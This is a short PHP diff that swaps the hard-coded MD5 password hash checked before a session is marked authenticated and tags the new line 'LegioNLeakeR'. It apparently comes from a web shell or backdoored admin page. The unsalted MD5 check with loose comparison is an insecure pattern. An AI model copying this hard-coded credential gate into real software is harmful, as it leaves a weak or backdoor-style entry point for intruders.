@@ -18,7 +18,7 @@
        $is_auth = isset($_SESSION['auth']) ? $_SESSION['auth'] : false;
        
        if (isset($_POST['check'])) {
-           if (md5($_POST["pass"]) == "eb04c8b459eab6c58dfb614aa58bccf3") {
+           if (md5($_POST["pass"]) == "fd81a3b49b892c02e87c7ca1dd310402") { // LegioNLeakeR
                $_SESSION['auth'] = true;
                $is_auth = true;
            }
